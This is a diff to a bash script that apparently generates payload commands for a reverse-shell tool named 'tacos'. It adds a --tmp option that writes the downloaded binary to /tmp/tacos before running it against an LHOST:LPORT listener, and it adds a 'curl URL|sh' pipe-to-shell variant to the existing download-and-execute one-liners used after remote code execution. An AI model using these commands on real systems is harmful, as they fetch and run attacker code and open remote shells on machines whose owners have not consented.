@@ -23,6 +23,9 @@ for i in "$@"; do
     --windows|-w)
         WINDOWS=true
         ;;
+    --tmp)
+        TACOS_IN_TMP=true
+        ;;
     --no-shortcuts|-N)
         SHORTCUT="" # ~ setting at false
         ;;
@@ -121,6 +124,10 @@ if [[ "$WINDOWS" ]]; then
     REMOTE_CMD="curl -O $DOWNLOAD_URL && .\\${BINARY} ${LHOST}:${LPORT}"
 else
     REMOTE_CMD="curl -s -O $DOWNLOAD_URL && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+    ## Sometimes RCE is not in a writable directory
+    if [[ "$TACOS_IN_TMP" ]]; then
+        REMOTE_CMD="mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/${BINARY} $DOWNLOAD_URL && chmod +x /tmp/tacos/${BINARY} && /tmp/tacos/${BINARY} ${LHOST}:${LPORT}"
+    fi
 fi
 
 ## with shorter shortcut?
@@ -133,8 +140,9 @@ if [[ "$SHORTCUT" ]]; then
     else
         SHORTCUT_URL="${SHORTCUT_URL}/sh"
     fi
-    REMOTE_CMD="\nsh -c \"\$(curl ${SHORTCUT_URL})\"\nsh <(curl ${SHORTCUT_URL})"
-    #curl ${SHORTCUT_URL} |sh\n does not work due to /pkg/tacos/tacos.go:94
+    REMOTE_CMD="\nsh -c \"\$(curl ${SHORTCUT_URL})\"\nsh <(curl ${SHORTCUT_URL})\ncurl ${SHORTCUT_URL}|sh\n"
+    ## curl ${SHORTCUT_URL} |sh\n work but trigger error (/pkg/tacos/tacos.go:94)
+    # sh <() only work in zsh & bash
 fi
 
 echo
